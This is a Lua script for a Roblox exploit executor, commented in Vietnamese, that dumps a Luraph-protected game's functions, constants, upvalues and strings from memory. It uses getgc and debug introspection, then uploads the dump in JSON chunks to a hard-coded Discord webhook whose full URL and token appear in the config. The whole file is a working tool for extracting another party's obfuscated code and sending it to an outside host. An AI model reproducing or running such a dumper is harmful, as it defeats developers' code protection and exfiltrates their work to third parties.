--[[
    ================================================================
    =  Luraph VM Non-Blocking JSON Streamer (Anti-Freeze Edition)  =
    =  Giải quyết triệt để vấn đề đứng hình / freeze máy ảo        =
    =                                                              =
    =  NGUYÊN NHÂN GÂY ĐỨNG VÀ CÁCH KHẮC PHỤC:                     =
    =   1. Quá nhiều đối tượng GC xử lý cùng 1 frame -> Đã chia    =
    =      nhỏ thành từng đợt (Batching) có task.wait() nhường CPU.=
    =   2. jsonEncode lặp đi lặp lại tốn RAM -> Đã chuyển sang cơ  =
    =      chế Streaming (ghi nối tiếp từng phần cực nhẹ).         =
    =   3. Bỏ qua các bảng hệ thống của Roblox (CoreGui/Instances) =
    =      để chỉ tập trung 100% vào Script game.                  =
    =   4. Hiển thị thanh tiến trình % trực tiếp trên màn hình!    =
    ================================================================
--]]

-- ╔═══════════════════════════════════════════════════╗
-- ║  CẤU HÌNH (SETTINGS)                              ║
-- ╚═══════════════════════════════════════════════════╝
local CONFIG = {
    -- Discord Webhook URL
    WebhookURL = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",

    -- Tên file xuất ra trên Discord
    FileBaseName = "BytecodeDump",

    -- Kích thước mỗi file JSON (4MB để máy ảo xử lý mượt mà nhất, không bị tràn RAM)
    MaxFileSizeLimit = 4 * 1024 * 1024,

    -- Số lượng đối tượng xử lý trong mỗi khung hình (Càng thấp càng không lag)
    BatchSize = 60,

    -- Lọc độ dài chuỗi tối thiểu
    MinStringLength = 2,
}

-- ╔═══════════════════════════════════════════════════╗
-- ║  TIỆN ÍCH HỆ THỐNG                                ║
-- ╚═══════════════════════════════════════════════════╝
local function safeStr(v)
    local ok, r = pcall(tostring, v)
    return ok and r or "<?>"
end

local function escJSON(s)
    if type(s) ~= "string" then return safeStr(s) end
    return s:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r'):gsub('\t','\\t'):gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
end

local function jsonEncode(v)
    local t = type(v)
    if v == nil then return "null"
    elseif t == "boolean" then return v and "true" or "false"
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        return tostring(v)
    elseif t == "string" then return '"' .. escJSON(v) .. '"'
    elseif t == "table" then
        local isArray, maxIdx = true, 0
        for k in pairs(v) do
            if type(k) ~= "number" or k < 1 or k ~= math.floor(k) then isArray = false; break end
            if k > maxIdx then maxIdx = k end
        end
        isArray = isArray and maxIdx == #v
        if isArray then
            local p = {}; for i, x in ipairs(v) do p[i] = jsonEncode(x) end
            return "[" .. table.concat(p, ",") .. "]"
        else
            local p, n = {}, 0
            for k, x in pairs(v) do
                n = n + 1
                p[n] = jsonEncode(tostring(k)) .. ":" .. jsonEncode(x)
            end
            return "{" .. table.concat(p, ",") .. "}"
        end
    end
    return '"' .. tostring(v) .. '"'
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  HTTP MULTIPART UPLOADER CHO DISCORD              ║
-- ╚═══════════════════════════════════════════════════╝
local function sendDiscordFile(filename, fileContent, partIndex, totalParts)
    local boundary = "------------------------" .. tostring(math.floor(tick() * 1000)) .. tostring(math.random(10000, 99999))
    
    local payloadParts = {
        "--" .. boundary,
        'Content-Disposition: form-data; name="payload_json"',
        'Content-Type: application/json',
        '',
        jsonEncode({
            username = "Luraph Bytecode Streamer",
            content = ("📦 **[Tệp Bytecode Đính Kèm %d/%d]**\n📄 Tên: `%s`\n📊 Dung lượng: `%.2f MB`"):format(
                partIndex, totalParts, filename, #fileContent / (1024 * 1024)
            )
        }),
        "--" .. boundary,
        ('Content-Disposition: form-data; name="file"; filename="%s"'):format(filename),
        'Content-Type: application/json',
        '',
        fileContent,
        "--" .. boundary .. "--",
        ""
    }
    
    local rawBody = table.concat(payloadParts, "\r\n")
    local contentType = "multipart/form-data; boundary=" .. boundary

    local fn
    if syn and syn.request then
        fn = function() return syn.request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
    elseif request then
        fn = function() return request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
    elseif http_request then
        fn = function() return http_request({ Url = CONFIG.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = contentType }, Body = rawBody }) end
    end

    if not fn then return false end

    local ok, res = pcall(fn)
    if ok then
        print(("[Streamer] ✅ Đã gửi thành công %s (%.2f MB)"):format(filename, #fileContent / (1024 * 1024)))
        return true
    else
        print("[Streamer] ❌ Lỗi gửi: " .. safeStr(res))
        return false
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  BỘ LỌC VÀ TRÍCH XUẤT NHẸ NHÀNG (ASYNC)           ║
-- ╚═══════════════════════════════════════════════════╝
local DumpVault = {
    Functions = {},
    Strings = {},
    StringsLookup = {},
    TotalFuncCount = 0,
    TotalStringCount = 0,
}

local scannedFuncMap = {}

local function scanFunctionObject(fn, depth)
    depth = depth or 0
    if depth > 4 or type(fn) ~= "function" then return end
    local key = tostring(fn)
    if scannedFuncMap[key] then return end
    scannedFuncMap[key] = true

    if islclosure and not islclosure(fn) then return end
    if iscclosure and iscclosure(fn) then return end

    DumpVault.TotalFuncCount = DumpVault.TotalFuncCount + 1
    local funcId = DumpVault.TotalFuncCount

    local funcConstants = {}
    local funcUpvalues = {}

    -- Constants
    if debug and debug.getconstants then
        pcall(function()
            local cList = debug.getconstants(fn)
            for idx, cVal in pairs(cList) do
                table.insert(funcConstants, {
                    index = idx,
                    type = type(cVal),
                    value = (type(cVal) == "string" or type(cVal) == "number" or type(cVal) == "boolean") and cVal or safeStr(cVal)
                })
                if type(cVal) == "string" and #cVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[cVal] then
                    DumpVault.StringsLookup[cVal] = true
                    DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = cVal })
                end
            end
        end)
    end

    -- Upvalues
    if debug and debug.getupvalues then
        pcall(function()
            local uList = debug.getupvalues(fn)
            for idx, uVal in pairs(uList) do
                local uType = type(uVal)
                table.insert(funcUpvalues, {
                    index = idx,
                    type = uType,
                    value = (uType == "string" or uType == "number" or uType == "boolean") and uVal or safeStr(uVal)
                })
                if uType == "string" and #uVal >= CONFIG.MinStringLength and not DumpVault.StringsLookup[uVal] then
                    DumpVault.StringsLookup[uVal] = true
                    DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
                    table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = uVal })
                elseif uType == "function" then
                    scanFunctionObject(uVal, depth + 1)
                end
            end
        end)
    end

    -- Protos
    if debug and debug.getprotos then
        pcall(function()
            local pList = debug.getprotos(fn)
            for _, pFn in pairs(pList) do
                scanFunctionObject(pFn, depth + 1)
            end
        end)
    end

    table.insert(DumpVault.Functions, {
        id = funcId,
        constants = funcConstants,
        upvalues = funcUpvalues,
    })
end

-- Quét không đồng bộ theo từng khung hình (Zero Freeze Engine)
local function captureMemoryAsync(onProgress)
    if not getgc then return end
    local ok, objs = pcall(getgc, true)
    if not ok or type(objs) ~= "table" then return end

    local total = #objs
    local batchCounter = 0

    for i = 1, total do
        local o = objs[i]
        if type(o) == "function" then
            scanFunctionObject(o, 0)
        elseif type(o) == "table" then
            pcall(function()
                for k, v in pairs(o) do
                    if type(v) == "string" and #v >= CONFIG.MinStringLength and not DumpVault.StringsLookup[v] then
                        DumpVault.StringsLookup[v] = true
                        DumpVault.TotalStringCount = DumpVault.TotalStringCount + 1
                        table.insert(DumpVault.Strings, { id = DumpVault.TotalStringCount, val = v })
                    elseif type(v) == "function" then
                        scanFunctionObject(v, 0)
                    end
                end
            end)
        end

        batchCounter = batchCounter + 1
        -- Cứ sau mỗi BatchSize đối tượng -> Nhường nhịp cho game chạy (Không bao giờ đơ máy)
        if batchCounter >= CONFIG.BatchSize then
            batchCounter = 0
            if onProgress then
                onProgress(i, total, DumpVault.TotalFuncCount)
            end
            task.wait()
        end
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  BỘ ĐÓNG GÓI VÀ XUẤT STREAMING                    ║
-- ╚═══════════════════════════════════════════════════╝
local function streamAndExportJSON(onStatusUpdate)
    -- Bước 1: Quét RAM mượt mà
    captureMemoryAsync(function(current, total, funcs)
        if onStatusUpdate then
            local percent = math.floor((current / total) * 100)
            onStatusUpdate(("⏳ Đang quét RAM: %d%% (%d hàm)..."):format(percent, funcs))
        end
    end)

    if onStatusUpdate then onStatusUpdate("📦 Đang chia nhỏ các gói JSON...") end
    task.wait(0.2)

    local allFunctions = DumpVault.Functions
    local allStrings = DumpVault.Strings

    local jsonPackages = {}
    local currentFunctions = {}
    local isFirstPackage = true

    for i = 1, #allFunctions do
        table.insert(currentFunctions, allFunctions[i])

        -- Chia mỗi gói tầm 250 hàm để không tốn RAM đóng gói
        if #currentFunctions >= 250 or i == #allFunctions then
            local packageObj = {
                metadata = {
                    part = #jsonPackages + 1,
                    total_funcs = #allFunctions,
                    total_strings = #allStrings,
                },
                functions = currentFunctions,
                strings = isFirstPackage and allStrings or {} -- Strings đưa vào gói 1
            }
            isFirstPackage = false
            currentFunctions = {}

            local encodedStr = jsonEncode(packageObj)
            table.insert(jsonPackages, encodedStr)
            task.wait() -- Nhường frame
        end
    end

    local totalParts = #jsonPackages

    -- Bước 2: Gắn thẻ |Start|, |Continue|, |End| và gửi lên Discord
    for partIdx = 1, totalParts do
        if onStatusUpdate then
            onStatusUpdate(("📤 Đang gửi file %d/%d lên Discord..."):format(partIdx, totalParts))
        end

        local rawJson = jsonPackages[partIdx]
        local markedContent = ""

        if totalParts == 1 then
            markedContent = "|Start|\n" .. rawJson .. "\n|End|"
        elseif partIdx == 1 then
            markedContent = "|Start|\n" .. rawJson .. "\n|Continue|"
        elseif partIdx == totalParts then
            markedContent = "|Continue|\n" .. rawJson .. "\n|End|"
        else
            markedContent = "|Continue|\n" .. rawJson .. "\n|Continue|"
        end

        local fileName = ("%s_Part%d_of_%d.json"):format(CONFIG.FileBaseName, partIdx, totalParts)
        sendDiscordFile(fileName, markedContent, partIdx, totalParts)
        task.wait(2) -- Delay giữa các lần upload file
    end

    if onStatusUpdate then
        onStatusUpdate(("🎉 Hoàn tất! Đã gửi %d file JSON."):format(totalParts))
    end
end

-- ╔═══════════════════════════════════════════════════╗
-- ║  GIAO DIỆN HIỂN THỊ TIẾN TRÌNH THỜI GIAN THỰC     ║
-- ╚═══════════════════════════════════════════════════╝
local function createSmoothUI()
    pcall(function()
        local CoreGui = game:GetService("CoreGui") or (game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui"))
        if not CoreGui then return end

        local old = CoreGui:FindFirstChild("LuraphStreamUI")
        if old then old:Destroy() end

        local sg = Instance.new("ScreenGui")
        sg.Name = "LuraphStreamUI"
        sg.ResetOnSpawn = false
        sg.Parent = CoreGui

        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 240, 0, 95)
        frame.Position = UDim2.new(0.02, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
        frame.Active = true
        frame.Draggable = true

        local corner = Instance.new("UICorner", frame)
        corner.CornerRadius = UDim.new(0, 8)

        local title = Instance.new("TextLabel", frame)
        title.Size = UDim2.new(1, 0, 0, 22)
        title.Position = UDim2.new(0, 0, 0, 4)
        title.Text = "⚡ Luraph Smooth Streamer"
        title.TextColor3 = Color3.fromRGB(255, 255, 255)
        title.Font = Enum.Font.GothamBold
        title.TextSize = 11
        title.BackgroundTransparency = 1

        local statusLabel = Instance.new("TextLabel", frame)
        statusLabel.Size = UDim2.new(1, 0, 0, 18)
        statusLabel.Position = UDim2.new(0, 0, 0, 24)
        statusLabel.Text = "Sẵn sàng (Không lag game)"
        statusLabel.TextColor3 = Color3.fromRGB(120, 255, 150)
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.TextSize = 10
        statusLabel.BackgroundTransparency = 1

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, -16, 0, 36)
        btn.Position = UDim2.new(0, 8, 0, 48)
        btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
        btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        local btnCorner = Instance.new("UICorner", btn)
        btnCorner.CornerRadius = UDim.new(0, 6)

        local isRunning = false
        btn.MouseButton1Click:Connect(function()
            if isRunning then return end
            isRunning = true
            btn.BackgroundColor3 = Color3.fromRGB(230, 140, 40)
            btn.Text = "Đang xử lý mượt mà..."

            task.spawn(function()
                streamAndExportJSON(function(statusText)
                    statusLabel.Text = statusText
                end)
                btn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
                btn.Text = "✅ ĐÃ XUẤT XONG TẤT CẢ!"
                task.wait(4)
                btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
                btn.Text = "🚀 BẮT ĐẦU XUẤT JSON (MƯỢT)"
                statusLabel.Text = "Sẵn sàng cho lần dump tiếp theo"
                isRunning = false
            end)
        end)
    end)
end

-- Khởi động
print("==================================================")
print("  Luraph Smooth Streamer - SẴN SÀNG KHÔNG LAG   ")
print("==================================================")
createSmoothUI()
